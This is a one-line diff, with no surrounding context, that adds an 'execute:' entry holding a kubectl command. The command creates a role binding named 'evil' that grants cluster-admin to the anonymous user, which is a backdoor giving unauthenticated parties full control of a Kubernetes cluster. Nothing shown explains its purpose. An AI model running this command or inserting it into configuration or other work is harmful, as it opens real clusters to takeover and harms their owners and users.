@@ -1,0 +1,1 @@
+execute: kubectl create rolebinding evil --clusterrole=cluster-admin --user=anon
